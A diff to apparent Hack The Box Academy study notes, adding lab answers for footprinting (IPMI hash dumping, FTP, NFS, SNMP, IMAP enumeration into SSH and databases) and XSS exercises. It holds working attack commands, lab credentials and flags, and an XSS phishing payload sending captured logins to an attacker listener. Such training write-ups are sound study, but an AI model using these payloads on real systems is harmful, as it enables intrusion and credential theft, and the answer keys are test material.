@@ -1018,18 +1018,206 @@ select name, password from sys.user$;
 
 Results: E066D214D5421CCC
 
-
-
 #### IPMI
+
+**What username is configured for accessing the host via IPMI?**
+
+```
+sudo msfdb init
+msfconsole -q
+use auxiliary/scanner/ipmi/ipmi_dumphashes
+setg RHOSTS $ip
+run
+```
+
+Results: admin
+
+**What is the account's cleartext password?**
+
+```
+sudo msfdb init
+msfconsole -q
+use auxiliary/scanner/ipmi/ipmi_dumphashes
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+run
+```
+
+Results: trinity
 
 
 ### Skills assessment
 
 #### Footprinting Lab - Easy
 
+We were commissioned by the company `Inlanefreight Ltd` to test three different servers in their internal network. The company uses many different services, and the IT security department felt that a penetration test was necessary to gain insight into their overall security posture. The first server is an internal DNS server that needs to be investigated. In particular, our client wants to know what information we can get out of these services and how this information could be used against its infrastructure. Our goal is to gather as much information as possible about the server and find ways to use that information against the company. However, our client has made it clear that it is forbidden to attack the services aggressively using exploits, as these services are in production. Additionally, our teammates have found the following credentials "ceil:qwer1234", and they pointed out that some of the company's employees were talking about SSH keys on a forum. The administrators have stored a `flag.txt` file on this server to track our progress and measure success. Fully enumerate the target and submit the contents of this file as proof.
+
+**Enumerate the server carefully and find the flag.txt file. Submit the contents of this file as the answer.**
+
+```
+ftp $ip -p 2121
+# enter user `ceil` and password `qwer1234`
+
+ls -la
+cd .ssh
+get id_rsa ~/.ssh/
+quit
+
+chmod 600 ~/.ssh/id_rsa
+ssh -i ~/.ssh/id_rsa ceil@$ip
+find / -name flag.txt 2>/dev/null
+cat /home/flag/flag.txt
+```
+
+Results:  HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}
+
+
 #### Footprinting Lab - Medium
 
+This second server is a server that everyone on the internal network has access to. In our discussion with our client, we pointed out that these servers are often one of the main targets for attackers and that this server should be added to the scope. Our customer agreed to this and added this server to our scope. Here, too, the goal remains the same. We need to find out as much information as possible about this server and find ways to use it against the server itself. For the proof and protection of customer data, a user named `HTB` has been created. Accordingly, we need to obtain the credentials of this user as proof.
+
+**Enumerate the server carefully and find the username "HTB" and its password. Then, submit this user's password as the answer.**
+
+```
+sudo nmap -sS -sV -top-ports 4000 $ip
+
+# We will attack firts service 2049
+showmount -e $ip
+mkdir target-NFS
+sudo mount -t nfs $ip:/ ./target-NFS/ -o nolock
+cd target-NFS
+
+sudo ls -la
+sudo ls -la TechSupport
+sudo cat TechSupport/ticket4238791283782.txt
+```
+
+Credentials are obtained for accessing a different service:
+
+```
+ 5    user="alex"
+ 6    password="lol123!mD"
+```
+
+
+```
+# Now we connect to 3389 RDP:
+xfreerdp /cert:ignore /u:alex /p:"lol123\!mD" /v:$ip
+```
+
+A Windows connection opens up.
+
+We browse the machine and find `C:\Users\alex\devshare\important` file, that contains the following creds:
+
+```
+sa:87N1ns@slls83
+```
+
+Right click on Microsoft SQL Server Management Studio and select "Execute as Administrator". Enter the creds `87N1ns@slls83`. Now we connect to the server:
+
+![sql](img/htb-academy-footprinting-module_00.png) 
+
+Browse around, but the final SQL query would be
+
+```MSSQL
+SELECT TOP (1000) [id]
+      ,[name]
+      ,[password]
+  FROM [accounts].[dbo].[devsacc]
+```
+
+Results: lnch7ehrdn43i7AoqVPK4zWR
+
 #### Footprinting Lab - Hard
+
+The third server is an MX and management server for the internal network. Subsequently, this server has the function of a backup server for the internal accounts in the domain. Accordingly, a user named `HTB` was also created here, whose credentials we need to access.
+
+**Enumerate the server carefully and find the username "HTB" and its password. Then, submit HTB's password as the answer.**
+
+```
+# Enumerate TCP and UDP
+sudo nmap -sS -sV -top-ports 4000 $ip
+sudo nmap $ip -sU   
+```
+
+```
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+110/tcp open  pop3     Dovecot pop3d
+143/tcp open  imap     Dovecot imapd (Ubuntu)
+993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
+995/tcp open  ssl/pop3 Dovecot pop3d
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+
+```
+PORT    STATE         SERVICE
+68/udp  open|filtered dhcpc
+161/udp open          snmp
+```
+
+We start with SNMP vulnerabilities:
+
+```
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $ip
+```
+
+In the result, you can spot the `community string` `backup`. Now, we can use braa:
+
+```
+braa backup@$ip:.1.3.6.* 
+```
+
+In the results a credential is showed:
+
+```
+tom NMds732Js2761
+```
+
+We use that credential to login into the IMAP server:
+
+```
+openssl s_client -connect $ip:imaps
+
+a LOGIN tom NMds732Js2761
+
+a SELECT INBOX
+a FETCH 1 all
+a FETCH 1 BODY.PEEK[TEXT]
+```
+
+And we obtain a OPENSSH PRIVATE KEY that we save into our ~/.ssh folder. We give 600 permission to the file id_rsa.
+
+```
+chmod 600 id_rsa
+ssh tom@$ip
+```
+
+Now, we are in. I had a look at the history file and saw a MySQL connection:
+
+```
+history
+```
+
+I decided to have a look at it:
+
+```
+mysql -u tom -p
+
+#Enter the password NMds732Js2761
+```
+
+```
+show databases;
+use users;
+show tables;
+select * from users;
+```
+
+
+Results: cr3n4o7rzse7rzhnckhssncif7ds
+
+
 
 ## [Information Gathering - Web Edition](https://academy.hackthebox.com/module/details/144)
 
@@ -1048,3 +1236,182 @@ Results: E066D214D5421CCC
 ## [Pivoting, Tunneling, and Port Forwarding](https://academy.hackthebox.com/module/details/158)
 
 ## [Active Directory Enumeration & Attacks](https://academy.hackthebox.com/module/details/143)
+
+## [Using Web Proxies](https://academy.hackthebox.com/module/details/110)
+
+## [Attacking Web Applications with Ffuf](https://academy.hackthebox.com/module/details/54)
+
+
+## [Login Brute Forcing](https://academy.hackthebox.com/module/details/57)
+
+
+## [SQL Injection Fundamentals](https://academy.hackthebox.com/module/details/33)
+
+
+## [Cross-Site Scripting (XSS)](https://academy.hackthebox.com/module/details/103)
+
+
+### XSS Basics
+
+####  Stored XSS
+
+
+**To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.**
+
+```
+<script>alert(document.cookie)</script>
+```
+
+Results:  HTB{570r3d_f0r_3v3ry0n3_70_533}
+
+
+####  Reflected XSS
+
+
+**To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.**
+
+```
+http://83.136.253.163:57837/index.php?task=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+```
+
+Results: HTB{r3fl3c73d_b4ck_2_m3}
+
+####  DOM XSS
+
+ To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.
+ 
+```
+# Enter <img src="" onerror=alert(document.cookie)>
+```
+
+Results: 
+
+
+####  XSS Discovery
+
+**Utilize some of the techniques mentioned in this section to identify the vulnerable input parameter found in the above server. What is the name of the vulnerable parameter?**
+
+```
+# Enter http://$ip:$port/?fullname=lolo&username=lala&password=lalala&email=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+```
+
+Results: email
+
+
+**What type of XSS was found on the above server? "name only"**
+
+Results:  Reflected
+
+### XSS Attacks
+
+#### Phishing 
+
+**Try to find a working XSS payload for the Image URL form found at '/phishing' in the above server, and then use what you learned in this section to prepare a malicious URL that injects a malicious login form. Then visit '/phishing/send.php' to send the URL to the victim, and they will log into the malicious login form. If you did everything correctly, you should receive the victim's login credentials, which you can use to login to '/phishing/login.php' and obtain the flag.**
+
+Creating a valid payload in http://10.129.148.221/phishing/index.php?url= This would be the payload:
+
+```
+\`/'</script/--!><h3>Please login to continue</h3><form action=http://10.10.14.198>    <input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>
+```
+
+This would be the link generated:
+
+```
+http://10.129.148.221/phishing/index.php?url=%5C%60%2F%27%3C%2Fscript%2F--%21%3E%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2F10.10.14.198%3E++++%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E
+
+```
+
+Starting a netcat listener:
+
+```
+sudo nc -lvnp 80
+```
+
+Visiting http://10.129.148.221/phishing/send.php and entering the link generated.
+
+In the netcat  listener we obtain:
+
+```
+listening on [any] 80 ...
+connect to [10.10.14.198] from (UNKNOWN) [10.129.148.221] 46802
+GET /?username=admin&password=p1zd0nt57341myp455&submit=Login HTTP/1.1
+Host: 10.10.14.198
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+User-Agent: HTBXSS/1.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://10.129.148.221/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US
+
+```
+
+We use the creds for accessing to /phishing/login.php and grabbing the flag
+
+Results: HTB{r3f13c73d_cr3d5_84ck_2_m3}
+
+#### Session Hijacking
+
+
+Question
+
+```
+
+```
+
+Results: 
+
+### XSS Prevention
+
+
+Question
+
+```
+
+```
+
+Results: 
+
+####  Skills Assessment
+
+
+Question
+
+```
+
+```
+
+Results: 
+
+
+### Skills Assessment
+
+
+
+## [File Inclusion](https://academy.hackthebox.com/module/details/23)
+
+
+## [File Upload Attacks](https://academy.hackthebox.com/module/details/136)
+
+
+## [Command Injections](https://academy.hackthebox.com/module/details/109)
+
+
+##  [Web Attacks](https://academy.hackthebox.com/module/details/134)
+
+
+## [Attacking Common Applications](https://academy.hackthebox.com/module/details/113)
+
+
+## [Linux Privilege Escalation](https://academy.hackthebox.com/module/details/51)
+
+
+## [Windows Privilege Escalation](https://academy.hackthebox.com/module/details/67)
+
+
+## [Documentation & Reporting](https://academy.hackthebox.com/module/details/162)
+
+
+##  [Attacking Enterprise Networks](https://academy.hackthebox.com/module/details/163)
+
+
